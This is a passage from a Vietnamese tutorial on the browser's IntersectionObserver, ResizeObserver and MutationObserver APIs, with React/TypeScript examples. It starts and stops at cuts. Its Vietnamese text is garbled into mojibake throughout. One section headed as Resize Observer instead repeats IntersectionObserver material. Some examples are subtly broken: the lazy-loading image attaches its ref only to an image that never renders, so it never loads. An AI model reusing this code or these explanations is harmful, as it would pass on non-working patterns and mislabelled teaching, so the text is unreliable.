â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ Theo dÃµi thay Ä‘á»•i kÃ­ch thÆ°á»›c cá»§a element              â”‚ â”‚
â”‚  â”‚ â€¢ Use cases: Responsive components, Charts, Layouts     â”‚ â”‚
â”‚  â”‚ â€¢ Thay tháº¿: window.resize event + polling               â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                               â”‚
â”‚  3ï¸âƒ£ MUTATION OBSERVER (Quan sÃ¡t thay Ä‘á»•i DOM)               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ Theo dÃµi thay Ä‘á»•i DOM tree (add/remove/modify)        â”‚ â”‚
â”‚  â”‚ â€¢ Use cases: Auto-init, Debug, Third-party integration  â”‚ â”‚
â”‚  â”‚ â€¢ Thay tháº¿: Mutation Events (deprecated)                â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

**ğŸ” 1. INTERSECTION OBSERVER API (Quan SÃ¡t Giao Äiá»ƒm)**

**KhÃ¡i niá»‡m:**
- API theo dÃµi khi má»™t element **xuáº¥t hiá»‡n, biáº¿n máº¥t hoáº·c giao nhau** vá»›i viewport (hoáº·c má»™t element cha)
- Sá»­ dá»¥ng cho: Lazy loading images, Infinite scroll, Visibility tracking, Analytics

**Hoáº¡t Ä‘á»™ng:**
1. Táº¡o observer vá»›i callback function
2. ÄÄƒng kÃ½ cÃ¡c elements cáº§n theo dÃµi
3. Callback Ä‘Æ°á»£c gá»i **báº¥t Ä‘á»“ng bá»™** khi element vÃ o/ra khá»i vÃ¹ng quan sÃ¡t
4. Browser engine tá»± tá»‘i Æ°u, khÃ´ng cáº§n poll/scroll listener liÃªn tá»¥c

**Æ¯u Ä‘iá»ƒm:**
- âœ… **Hiá»‡u nÄƒng cao**: KhÃ´ng block main thread, browser tá»‘i Æ°u internally
- âœ… **API Ä‘Æ¡n giáº£n**: Dá»… sá»­ dá»¥ng hÆ¡n scroll event + getBoundingClientRect()
- âœ… **Linh hoáº¡t**: Há»— trá»£ threshold (ngÆ°á»¡ng %), rootMargin (trigger sá»›m/muá»™n)
- âœ… **Giáº£m layout thrashing**: KhÃ´ng gÃ¢y reflow/repaint nhÆ° getBoundingClientRect()

**NhÆ°á»£c Ä‘iá»ƒm:**
- âš ï¸ Callback báº¥t Ä‘á»“ng bá»™ â†’ khÃ´ng Ä‘áº£m báº£o timing chÃ­nh xÃ¡c Ä‘áº¿n pixel
- âš ï¸ Cáº§n polyfill cho browsers ráº¥t cÅ© (IE11-)
- âš ï¸ KhÃ´ng phÃ¹ há»£p cho logic cáº§n Ä‘á»“ng bá»™ chÃ­nh xÃ¡c

**Code Example (TypeScript + React):**

```typescript
import { useEffect, useRef, useState } from 'react';

// ============================================
// A. LAZY LOADING IMAGES (Táº£i áº¢nh LÆ°á»i)
// ============================================

// Giáº£i thÃ­ch: Chá»‰ táº£i áº£nh khi user scroll Ä‘áº¿n gáº§n â†’ tiáº¿t kiá»‡m bandwidth, tÄƒng tá»‘c Ä‘á»™ load trang

function LazyImage({ src, alt }: { src: string; alt: string }) {
  const imgRef = useRef<HTMLImageElement>(null);
  const [imageSrc, setImageSrc] = useState<string>(''); // áº¢nh tháº­t chÆ°a load
  const [isLoaded, setIsLoaded] = useState(false);
  
  useEffect(() => {
    // Táº¡o Intersection Observer
    const observer = new IntersectionObserver(
      (entries) => {
        // entries: Danh sÃ¡ch cÃ¡c elements Ä‘ang Ä‘Æ°á»£c observe
        entries.forEach((entry) => {
          // entry.isIntersecting: true = element xuáº¥t hiá»‡n trong viewport
          if (entry.isIntersecting && !isLoaded) {
            console.log('âœ… Image vÃ o viewport, báº¯t Ä‘áº§u load:', src);
            
            // Load áº£nh tháº­t
            setImageSrc(src);
            setIsLoaded(true);
            
            // Ngá»«ng observe sau khi load (khÃ´ng cáº§n theo dÃµi ná»¯a)
            observer.unobserve(entry.target);
          }
        });
      },
      {
        root: null, // null = observe trong viewport (mÃ n hÃ¬nh)
        
        // rootMargin: Má»Ÿ rá»™ng vÃ¹ng observe
        // '50px' = trigger khi element cÃ²n cÃ¡ch viewport 50px
        // â†’ Preload áº£nh trÆ°á»›c khi user nhÃ¬n tháº¥y (UX mÆ°á»£t hÆ¡n)
        rootMargin: '50px',
        
        // threshold: NgÆ°á»¡ng % element hiá»ƒn thá»‹ Ä‘á»ƒ trigger callback
        // 0.1 = trigger khi 10% element visible
        threshold: 0.1
      }
    );
    
    // Báº¯t Ä‘áº§u observe image element
    if (imgRef.current) {
      observer.observe(imgRef.current);
    }
    
    // Cleanup: Disconnect observer khi component unmount
    return () => {
      observer.disconnect();
    };
  }, [src, isLoaded]);
  
  return (
    <div className="lazy-image-container">
      {!imageSrc ? (
        // Placeholder khi chÆ°a load (skeleton)
        <div className="skeleton-loader" style={{ width: '100%', height: 300, background: '#e0e0e0' }}>
          <span>Äang táº£i...</span>
        </div>
      ) : (
        <img 
          ref={imgRef}
          src={imageSrc} 
          alt={alt}
          onLoad={() => console.log('âœ… Image Ä‘Ã£ load xong')}
        />
      )}
    </div>
  );
}

// Sá»­ dá»¥ng:
function Gallery() {
  const images = [
    'https://example.com/image1.jpg',
    'https://example.com/image2.jpg',
    // ... 100+ images
  ];
  
  return (
    <div className="gallery">
      {images.map((src, i) => (
        <LazyImage key={i} src={src} alt={`Image ${i + 1}`} />
      ))}
    </div>
  );
}
// Káº¿t quáº£: Chá»‰ load 5-10 áº£nh Ä‘áº§u tiÃªn (trong viewport) thay vÃ¬ 100+ áº£nh cÃ¹ng lÃºc
// â†’ Trang load nhanh hÆ¡n 10x!

// ============================================
// B. INFINITE SCROLL (Cuá»™n VÃ´ Háº¡n)
// ============================================

// Giáº£i thÃ­ch: Tá»± Ä‘á»™ng load thÃªm data khi user scroll Ä‘áº¿n cuá»‘i danh sÃ¡ch

interface Order {
  id: string;
  symbol: string;
  price: number;
}

function InfiniteOrderList() {
  const [orders, setOrders] = useState<Order[]>([]);
  const [page, setPage] = useState(1);
  const [hasMore, setHasMore] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  
  // Ref cho sentinel element (pháº§n tá»­ "canh gÃ¡c" á»Ÿ cuá»‘i list)
  const sentinelRef = useRef<HTMLDivElement>(null);
  
  // Load more data
  const loadMoreOrders = async () => {
    if (isLoading || !hasMore) return;
    
    setIsLoading(true);
    console.log(`ğŸ“¥ Äang load page ${page}...`);
    
    try {
      const res = await fetch(`/api/orders?page=${page}&limit=20`);
      const newOrders = await res.json();
      
      if (newOrders.length === 0) {
        setHasMore(false); // Háº¿t data
        console.log('âœ… ÄÃ£ load háº¿t orders');
      } else {
        setOrders(prev => [...prev, ...newOrders]);
        setPage(prev => prev + 1);
        console.log(`âœ… Load thÃ nh cÃ´ng ${newOrders.length} orders`);
      }
    } catch (error) {
      console.error('âŒ Lá»—i load orders:', error);
    } finally {
      setIsLoading(false);
    }
  };
  
  useEffect(() => {
    // Táº¡o observer cho sentinel element
    const observer = new IntersectionObserver(
      (entries) => {
        const sentinel = entries[0];
        
        // Khi sentinel xuáº¥t hiá»‡n trong viewport â†’ load more
        if (sentinel.isIntersecting && hasMore && !isLoading) {
          console.log('ğŸ”„ Sentinel vÃ o viewport â†’ Load more...');
          loadMoreOrders();
        }
      },
      {
        root: null,
        rootMargin: '100px', // Trigger sá»›m 100px (load trÆ°á»›c khi user scroll Ä‘áº¿n cuá»‘i)
        threshold: 0
      }
    );
    
    if (sentinelRef.current) {
      observer.observe(sentinelRef.current);
    }
    
    return () => observer.disconnect();
  }, [hasMore, isLoading, page]);
  
  // Load initial data
  useEffect(() => {
    loadMoreOrders();
  }, []);
  
  return (
    <div className="order-list">
      <h2>ğŸ“‹ Orders (Infinite Scroll)</h2>
      
      {orders.map((order) => (
        <div key={order.id} className="order-item">
          <span>{order.symbol}</span>
          <span>${order.price}</span>
        </div>
      ))}
      
      {/* Sentinel element: Pháº§n tá»­ "canh gÃ¡c" á»Ÿ cuá»‘i list */}
      <div ref={sentinelRef} style={{ height: 20 }}>
        {isLoading && <span>â³ Äang táº£i thÃªm...</span>}
        {!hasMore && <span>âœ… ÄÃ£ hiá»ƒn thá»‹ táº¥t cáº£</span>}
      </div>
    </div>
  );
}
// CÃ¡ch hoáº¡t Ä‘á»™ng:
// 1. User scroll xuá»‘ng
// 2. Sentinel element vÃ o viewport
// 3. Observer trigger â†’ loadMoreOrders()
// 4. Fetch data má»›i, append vÃ o list
// 5. Láº·p láº¡i cho Ä‘áº¿n khi háº¿t data

// ============================================
// C. VISIBILITY TRACKING (Theo DÃµi Hiá»ƒn Thá»‹)
// ============================================

// Giáº£i thÃ­ch: Track % element hiá»ƒn thá»‹ â†’ gá»­i analytics
// VD: Biáº¿t Ä‘Æ°á»£c section nÃ o user Ä‘á»c nhiá»u nháº¥t

function VisibilityTracker({ children, id }: { children: React.ReactNode; id: string }) {
  const elementRef = useRef<HTMLDivElement>(null);
  const [visibilityPercentage, setVisibilityPercentage] = useState(0);
  
  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          // intersectionRatio: Tá»· lá»‡ % element hiá»ƒn thá»‹ (0.0 - 1.0)
          const percentage = Math.round(entry.intersectionRatio * 100);
          setVisibilityPercentage(percentage);
          
          console.log(`ğŸ‘ï¸ Section "${id}" hiá»ƒn thá»‹: ${percentage}%`);
          
          // Gá»­i analytics khi >50% visible
          if (percentage > 50) {
            // analytics.track('section_viewed', { id, percentage });
          }
        });
      },
      {
        root: null,
        threshold: [0, 0.25, 0.5, 0.75, 1.0] // Track á»Ÿ nhiá»u má»©c: 0%, 25%, 50%, 75%, 100%
      }
    );
    
    if (elementRef.current) {
      observer.observe(elementRef.current);
    }
    
    return () => observer.disconnect();
  }, [id]);
  
  return (
    <div ref={elementRef} className="tracked-section">
      <div className="visibility-indicator">
        Hiá»ƒn thá»‹: {visibilityPercentage}%
      </div>
      {children}
    </div>
  );
}

// Sá»­ dá»¥ng:
function Article() {
  return (
    <article>
      <VisibilityTracker id="section-1">
        <h2>Pháº§n 1: Giá»›i thiá»‡u</h2>
        <p>Ná»™i dung...</p>
      </VisibilityTracker>
      
      <VisibilityTracker id="section-2">
        <h2>Pháº§n 2: PhÃ¡t triá»ƒn</h2>
        <p>Ná»™i dung...</p>
      </VisibilityTracker>
    </article>
  );
}
```

**Best Practices (Thá»±c HÃ nh Tá»‘t):**

1. **âœ… DÃ¹ng `rootMargin` Ä‘á»ƒ preload sá»›m**
   ```typescript
   rootMargin: '50px' // Load trÆ°á»›c khi vÃ o viewport 50px â†’ UX mÆ°á»£t
   ```

2. **âœ… Unobserve sau khi xá»­ lÃ½ xong**
   ```typescript
   if (entry.isIntersecting) {
     // Xá»­ lÃ½...
     observer.unobserve(entry.target); // Ngá»«ng observe â†’ tiáº¿t kiá»‡m tÃ i nguyÃªn
   }
   ```

3. **âœ… DÃ¹ng multiple thresholds cho tracking chi tiáº¿t**
   ```typescript
   threshold: [0, 0.25, 0.5, 0.75, 1] // Track á»Ÿ 5 má»©c Ä‘á»™
   ```

4. **âœ… Káº¿t há»£p vá»›i native lazy loading**
   ```html
   <img src="image.jpg" loading="lazy" /> <!-- Browser native lazy load -->
   ```

**Common Mistakes (Lá»—i ThÆ°á»ng Gáº·p):**

```typescript
// âŒ Lá»–I 1: DÃ¹ng scroll event + getBoundingClientRect() (cháº­m, gÃ¢y layout thrashing)
window.addEventListener('scroll', () => {
  images.forEach((img) => {
    const rect = img.getBoundingClientRect(); // âŒ Trigger reflow má»—i scroll
    if (rect.top < window.innerHeight) {
      // Load image...
    }
  });
});

// âœ… Sá»¬A: DÃ¹ng IntersectionObserver (tá»‘i Æ°u, khÃ´ng block main thread)
const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
      // Load image...
    }
  });
});
images.forEach((img) => observer.observe(img));

// âŒ Lá»–I 2: QuÃªn disconnect observer â†’ memory leak
useEffect(() => {
  const observer = new IntersectionObserver(callback);
  observer.observe(element);
  // âŒ Thiáº¿u cleanup
}, []);

// âœ… Sá»¬A: LuÃ´n cleanup
useEffect(() => {
  const observer = new IntersectionObserver(callback);
  observer.observe(element);
  
  return () => {
    observer.disconnect(); // âœ… Cleanup khi unmount
  };
}, []);
```

---

**ğŸ” 2. RESIZE OBSERVER API (Quan SÃ¡t Thay Äá»•i KÃ­ch ThÆ°á»›c)**
- Hoáº¡t Ä‘á»™ng: ÄÄƒng kÃ½ callback Ä‘Æ°á»£c gá»i báº¥t Ä‘á»“ng bá»™ khi target element vÃ o/ra khá»i vÃ¹ng quan sÃ¡t; engine tá»‘i Æ°u khÃ´ng cáº§n poll/scroll listener liÃªn tá»¥c.
- Æ¯u Ä‘iá»ƒm: Hiá»‡u nÄƒng cao (khÃ´ng block main thread), API Ä‘Æ¡n giáº£n, há»— trá»£ threshold linh hoáº¡t; giáº£m layout thrashing so vá»›i getBoundingClientRect() trong scroll.
- NhÆ°á»£c Ä‘iá»ƒm: Callback báº¥t Ä‘á»“ng bá»™ nÃªn khÃ´ng Ä‘áº£m báº£o timing chÃ­nh xÃ¡c pixel; cáº§n polyfill cho trÃ¬nh duyá»‡t ráº¥t cÅ©; khÃ´ng phÃ¹ há»£p cho logic cáº§n sync chÃ­nh xÃ¡c.

ChÃº thÃ­ch: DÃ¹ng `rootMargin` Ä‘á»ƒ trigger sá»›m/muá»™n (vÃ­ dá»¥: lazy load trÆ°á»›c khi vÃ o viewport); `threshold` xÃ¡c Ä‘á»‹nh % giao nhau Ä‘á»ƒ fire callback.

**Code Example:**

```ts
// Lazy load images khi vÃ o viewport
const images = document.querySelectorAll('img[data-src]');

const imageObserver = new IntersectionObserver(
  (entries, observer) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        const img = entry.target as HTMLImageElement;
        // Load áº£nh tháº­t
        img.src = img.dataset.src!;
        img.removeAttribute('data-src');
        // Ngá»«ng observe sau khi load
        observer.unobserve(img);
      }
    });
  },
  {
    root: null, // viewport
    rootMargin: '50px', // trigger 50px trÆ°á»›c khi vÃ o viewport
    threshold: 0.1, // 10% visible lÃ  trigger
  }
);

images.forEach((img) => imageObserver.observe(img));

// Infinite scroll example
const sentinel = document.querySelector('#load-more-trigger');
const loadMoreObserver = new IntersectionObserver((entries) => {
  if (entries[0].isIntersecting) {
    loadMoreContent(); // fetch thÃªm data
  }
});
if (sentinel) loadMoreObserver.observe(sentinel);

// Cleanup
// loadMoreObserver.disconnect();
```

**Best Practices:**

- DÃ¹ng `rootMargin` Ä‘á»ƒ preload sá»›m cho UX mÆ°á»£t
- Unobserve sau khi xá»­ lÃ½ xong (trÃ¡nh callback thá»«a)
- DÃ¹ng `threshold: [0, 0.25, 0.5, 0.75, 1]` náº¿u cáº§n theo dÃµi nhiá»u má»©c Ä‘á»™
- Káº¿t há»£p vá»›i `loading="lazy"` native cho áº£nh

**Mistakes:**

```ts
// âŒ DÃ¹ng scroll listener + getBoundingClientRect â†’ cháº­m, layout thrashing
window.addEventListener('scroll', () => {
  images.forEach((img) => {
    const rect = img.getBoundingClientRect();
    if (rect.top < window.innerHeight) {
      // load image
    }
  });
});

// âœ… DÃ¹ng IntersectionObserver
const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
      // load image
    }
  });
});
```

---

**ğŸ” 2. RESIZE OBSERVER API (Quan SÃ¡t Thay Äá»•i KÃ­ch ThÆ°á»›c)**

**KhÃ¡i niá»‡m:**
- API theo dÃµi **thay Ä‘á»•i kÃ­ch thÆ°á»›c cá»§a element** (width, height)
- Sá»­ dá»¥ng cho: Responsive components, Charts auto-resize, Dynamic layouts

**Hoáº¡t Ä‘á»™ng:**
1. Callback Ä‘Æ°á»£c gá»i khi **content box hoáº·c border box** cá»§a element thay Ä‘á»•i
2. Cháº¡y **trÆ°á»›c paint** Ä‘á»ƒ trÃ¡nh visual flash
3. Há»— trá»£ nhiá»u box model: `content-box`, `border-box`, `device-pixel-content-box`

**Æ¯u Ä‘iá»ƒm:**
- âœ… **Hiá»‡u nÄƒng tá»‘t hÆ¡n** window.resize + polling
- âœ… **PhÃ¡t hiá»‡n resize tá»« báº¥t ká»³ nguá»“n**: CSS, JavaScript, user action
- âœ… **Per-element tracking**: Theo dÃµi tá»«ng element riÃªng láº» (khÃ´ng pháº£i toÃ n viewport)
- âœ… **KhÃ´ng cáº§n media queries**: Component tá»± responsive

**NhÆ°á»£c Ä‘iá»ƒm:**
- âš ï¸ Callback cÃ³ thá»ƒ fire liÃªn tá»¥c khi animate
- âš ï¸ Cáº§n debounce cho logic náº·ng
- âš ï¸ CÃ³ thá»ƒ gÃ¢y **infinite loop** náº¿u callback thay Ä‘á»•i size cá»§a chÃ­nh element Ä‘ang observe

**Code Example (TypeScript + React):**

```typescript
import { useEffect, useRef, useState } from 'react';

// ============================================
// A. RESPONSIVE COMPONENT (Component Tá»± Responsive)
// ============================================

// Giáº£i thÃ­ch: Component tá»± Ä‘iá»u chá»‰nh layout khi kÃ­ch thÆ°á»›c thay Ä‘á»•i
// KhÃ´ng cáº§n media queries â†’ component portable, reusable

function ResponsiveCard() {
  const cardRef = useRef<HTMLDivElement>(null);
  const [layout, setLayout] = useState<'horizontal' | 'vertical'>('horizontal');
  const [dimensions, setDimensions] = useState({ width: 0, height: 0 });
  
  useEffect(() => {
    // Táº¡o Resize Observer
    const resizeObserver = new ResizeObserver((entries) => {
      // entries: Danh sÃ¡ch cÃ¡c elements Ä‘ang observe
      for (const entry of entries) {
        // contentRect: KÃ­ch thÆ°á»›c content box cá»§a element
        const { width, height } = entry.contentRect;
        
        console.log(`ğŸ“ Card resize: ${width}x${height}`);
        setDimensions({ width, height });
        
        // Tá»± Ä‘á»™ng chuyá»ƒn layout dá»±a vÃ o width
        if (width < 500) {
          setLayout('vertical');   // Mobile: stack vertically
          console.log('â†’ Chuyá»ƒn sang vertical layout');
        } else {
          setLayout('horizontal'); // Desktop: side by side
          console.log('â†’ Chuyá»ƒn sang horizontal layout');
        }
      }
    });
    
    // Observe card element
    if (cardRef.current) {
      resizeObserver.observe(cardRef.current);
    }
    
    // Cleanup khi unmount
    return () => {
      resizeObserver.disconnect();
    };
  }, []);
  
  return (
    <div 
      ref={cardRef}
      className={`card ${layout}`}
      style={{
        display: 'flex',
        flexDirection: layout === 'vertical' ? 'column' : 'row',
        gap: '1rem',
        padding: '1rem',
        border: '1px solid #ccc'
      }}
    >
      <div className="card-image">
        <img src="/image.jpg" alt="Card" style={{ width: '100%' }} />
      </div>
      <div className="card-content">
        <h3>TiÃªu Ä‘á»</h3>
        <p>Ná»™i dung...</p>
        <p className="dimensions">
          ğŸ“ KÃ­ch thÆ°á»›c: {dimensions.width.toFixed(0)}px Ã— {dimensions.height.toFixed(0)}px
        </p>
      </div>
    </div>
  );
}
// Káº¿t quáº£: Component tá»± adapt layout khi container resize
// â†’ KhÃ´ng cáº§n CSS media queries â†’ Portable, reusable

// ============================================
// B. CHART AUTO-RESIZE (Biá»ƒu Äá»“ Tá»± Scale)
// ============================================

// Giáº£i thÃ­ch: Chart tá»± Ä‘á»™ng scale khi container resize
// VD: User má»Ÿ/Ä‘Ã³ng sidebar â†’ chart tá»± fit container má»›i

function TradingChart() {
  const containerRef = useRef<HTMLDivElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const chartInstance = useRef<any>(null); // Chart.js instance
  
  useEffect(() => {
    // Khá»Ÿi táº¡o chart
    if (canvasRef.current) {
      const ctx = canvasRef.current.getContext('2d');
      // chartInstance.current = new Chart(ctx, { ... });
    }
    
    // Observe container (KHÃ”NG observe canvas trá»±c tiáº¿p)
    // Táº¡i sao? Náº¿u observe canvas â†’ canvas resize â†’ observer fire â†’ canvas resize láº¡i â†’ loop!
    const resizeObserver = new ResizeObserver((entries) => {
      const { width, height } = entries[0].contentRect;
      
      console.log(`ğŸ“Š Chart container resize: ${width}x${height}`);
      
      // Resize chart Ä‘á»ƒ fit container
      if (chartInstance.current && canvasRef.current) {
        canvasRef.current.width = width;
        canvasRef.current.height = height;
        
        // Update chart dimensions
        chartInstance.current.resize(width, height);
        console.log('âœ… Chart Ä‘Ã£ resize');
      }
    });
    
    // Observe parent container (KHÃ”NG pháº£i canvas)
    if (containerRef.current) {
      resizeObserver.observe(containerRef.current);
    }
    
    return () => {
      resizeObserver.disconnect();
      // chartInstance.current?.destroy();
    };
  }, []);
  
  return (
    <div 
      ref={containerRef}
      className="chart-container"
      style={{ width: '100%', height: '400px', position: 'relative' }}
    >
      <canvas ref={canvasRef} />
    </div>
  );
}

// ============================================
// C. TEXTAREA AUTO-HEIGHT (Textarea Tá»± Äiá»u Chá»‰nh Chiá»u Cao)
// ============================================

// Giáº£i thÃ­ch: Textarea tá»± tÄƒng/giáº£m height khi user type
// KhÃ´ng cáº§n fixed height â†’ UX tá»‘t hÆ¡n

function AutoExpandTextarea() {
  const textareaRef = useRef<HTMLTextAreaElement>(null);
  const [height, setHeight] = useState(60); // Min height
  
  useEffect(() => {
    const resizeObserver = new ResizeObserver((entries) => {
      const { height } = entries[0].contentRect;
      
      // Chá»‰ log khi height thay Ä‘á»•i Ä‘Ã¡ng ká»ƒ (trÃ¡nh spam)
      if (Math.abs(height - entries[0].target.clientHeight) > 5) {
        console.log(`âœï¸ Textarea height: ${height}px`);
        setHeight(height);
      }
    });
    
    if (textareaRef.current) {
      // Observe textarea itself
      resizeObserver.observe(textareaRef.current);
    }
    
    return () => resizeObserver.disconnect();
  }, []);
  
  return (
    <div>
      <textarea 
        ref={textareaRef}
        placeholder="Type something..."
        style={{
          width: '100%',
          minHeight: '60px',
          resize: 'vertical', // Cho phÃ©p user resize manually
          padding: '0.5rem'
        }}
      />
      <p className="info">Current height: {height}px</p>
    </div>
  );
}
```

**Best Practices (Thá»±c HÃ nh Tá»‘t):**

1. **âœ… Debounce logic náº·ng vá»›i requestAnimationFrame**
   ```typescript
   const resizeObserver = new ResizeObserver((entries) => {
     requestAnimationFrame(() => {
       // Logic náº·ng (recalculate layout, re-render chart, etc.)
     });
   });
   ```

2. **âœ… Observe parent container, KHÃ”NG pháº£i element sáº½ resize**
   ```typescript
   // âŒ SAI: Observe canvas trá»±c tiáº¿p
   resizeObserver.observe(canvas);
   
   // âœ… ÄÃšNG: Observe parent container
   resizeObserver.observe(canvas.parentElement);
   ```

3. **âœ… Disconnect khi component unmount**
   ```typescript
   useEffect(() => {
     const observer = new ResizeObserver(callback);
     observer.observe(element);
     
     return () => observer.disconnect(); // âœ… Cleanup
   }, []);
   ```

4. **âœ… DÃ¹ng cho responsive components (thay tháº¿ media queries)**
   - Media queries: Dá»±a vÃ o viewport size
   - ResizeObserver: Dá»±a vÃ o component size â†’ Reusable hÆ¡n

**Common Mistakes (Lá»—i ThÆ°á»ng Gáº·p):**

```typescript
// âŒ Lá»–I 1: Infinite Loop - Resize chÃ­nh element Ä‘ang observe
const box = document.querySelector('.box') as HTMLElement;

const badObserver = new ResizeObserver(() => {
  // âŒ Thay Ä‘á»•i size cá»§a chÃ­nh element Ä‘ang observe
  box.style.width = (box.offsetWidth + 10) + 'px';
  // â†’ Observer fire â†’ tÄƒng width â†’ observer fire láº¡i â†’ loop vÃ´ háº¡n!
});
badObserver.observe(box);

// âœ… Sá»¬A: DÃ¹ng flag Ä‘á»ƒ ngÄƒn loop hoáº·c observe parent
let isResizing = false;

const goodObserver = new ResizeObserver(() => {
  if (!isResizing) {
    isResizing = true;
    
    // Logic resize
    requestAnimationFrame(() => {
      box.style.width = (box.offsetWidth + 10) + 'px';
      isResizing = false; // Reset flag
    });
  }
});
goodObserver.observe(box);

// âŒ Lá»–I 2: KhÃ´ng debounce logic náº·ng â†’ Cháº­m
const heavyObserver = new ResizeObserver((entries) => {
  // âŒ Logic náº·ng cháº¡y má»—i láº§n resize (cÃ³ thá»ƒ fire ráº¥t nhiá»u láº§n)
  entries.forEach((entry) => {
    recalculateComplexLayout(); // Expensive operation
    rerenderChart(); // Expensive operation
  });
});

// âœ… Sá»¬A: Debounce vá»›i requestAnimationFrame
const optimizedObserver = new ResizeObserver((entries) => {
  requestAnimationFrame(() => {
    // Logic náº·ng chá»‰ cháº¡y 1 láº§n per frame
    entries.forEach((entry) => {
      recalculateComplexLayout();
      rerenderChart();
    });
  });
});

// âŒ Lá»–I 3: QuÃªn disconnect â†’ Memory leak
function MyComponent() {
  useEffect(() => {
    const observer = new ResizeObserver(callback);
    observer.observe(element);
    // âŒ Thiáº¿u cleanup â†’ observer váº«n cháº¡y sau unmount
  }, []);
}

// âœ… Sá»¬A: LuÃ´n cleanup
function MyComponent() {
  useEffect(() => {
    const observer = new ResizeObserver(callback);
    observer.observe(element);
    
    return () => observer.disconnect(); // âœ… Cleanup
  }, []);
}
```

---

**ğŸ” 3. MUTATION OBSERVER API (Quan SÃ¡t Thay Äá»•i DOM)**

**KhÃ¡i niá»‡m:**
- API theo dÃµi **thay Ä‘á»•i DOM tree**: thÃªm/xÃ³a nodes, thay Ä‘á»•i attributes, thay Ä‘á»•i text content
- Thay tháº¿ cho **Mutation Events** (deprecated - Ä‘Ã£ lá»—i thá»i)
- Sá»­ dá»¥ng cho: Auto-init new elements, Debug DOM changes, Polyfill custom elements, Third-party integration

**Hoáº¡t Ä‘á»™ng:**
1. Callback Ä‘Æ°á»£c gá»i **báº¥t Ä‘á»“ng bá»™ (microtask)** khi cÃ³ mutation khá»›p config
2. Browser **gom nhÃ³m mutations** Ä‘á»ƒ giáº£m sá»‘ láº§n gá»i callback (batch processing)
3. Há»— trá»£ filter theo loáº¡i mutation: `childList`, `attributes`, `characterData`

**Æ¯u Ä‘iá»ƒm:**
- âœ… **Hiá»‡u nÄƒng tá»‘t hÆ¡n** Mutation Events (deprecated)
- âœ… **Linh hoáº¡t**: Filter chÃ­nh xÃ¡c loáº¡i mutation cáº§n quan tÃ¢m
- âœ… **Observe subtree**: Theo dÃµi toÃ n bá»™ cÃ¢y con (descendants)
- âœ… **Track old values**: LÆ°u giÃ¡ trá»‹ cÅ© cá»§a attributes/text

**NhÆ°á»£c Ä‘iá»ƒm:**
- âš ï¸ Callback báº¥t Ä‘á»“ng bá»™ â†’ khÃ´ng real-time
- âš ï¸ Performance issue náº¿u observe toÃ n `document.body` vá»›i `subtree: true`
- âš ï¸ Logic phá»©c táº¡p khi xá»­ lÃ½ nhiá»u mutations cÃ¹ng lÃºc

**Code Example (TypeScript + React):**

```typescript
import { useEffect, useRef } from 'react';

// ============================================
// A. THEME SWITCHER TRACKING (Theo DÃµi Äá»•i Theme)
// ============================================

// Giáº£i thÃ­ch: Theo dÃµi attribute data-theme thay Ä‘á»•i
// â†’ Update components khi user switch theme

function ThemeAwareComponent() {
  useEffect(() => {
    const root = document.documentElement; // <html> element
    
    // Táº¡o Mutation Observer
    const themeObserver = new MutationObserver((mutations) => {
      // mutations: Danh sÃ¡ch cÃ¡c thay Ä‘á»•i DOM
      mutations.forEach((mutation) => {
        // Chá»‰ quan tÃ¢m khi attribute thay Ä‘á»•i
        if (mutation.type === 'attributes' && mutation.attributeName === 'data-theme') {
          const newTheme = root.getAttribute('data-theme');
          const oldTheme = mutation.oldValue;
          
          console.log(`ğŸ¨ Theme changed: ${oldTheme} â†’ ${newTheme}`);
          
          // Update chart colors, reload styles, etc.
          updateComponentTheme(newTheme);
        }
      });
    });
    
    // Observe <html> element
    themeObserver.observe(root, {
      attributes: true,              // Theo dÃµi attributes thay Ä‘á»•i
      attributeFilter: ['data-theme'], // Chá»‰ quan tÃ¢m data-theme (ignore cÃ¡c attributes khÃ¡c)
      attributeOldValue: true        // LÆ°u giÃ¡ trá»‹ cÅ© (Ä‘á»ƒ so sÃ¡nh)
    });
    
    return () => themeObserver.disconnect();
  }, []);
  
  return <div>Theme-aware content...</div>;
}

function updateComponentTheme(theme: string | null) {
  // Update chart colors
  // Reload CSS variables
  // Re-render components with new theme
}

// ============================================
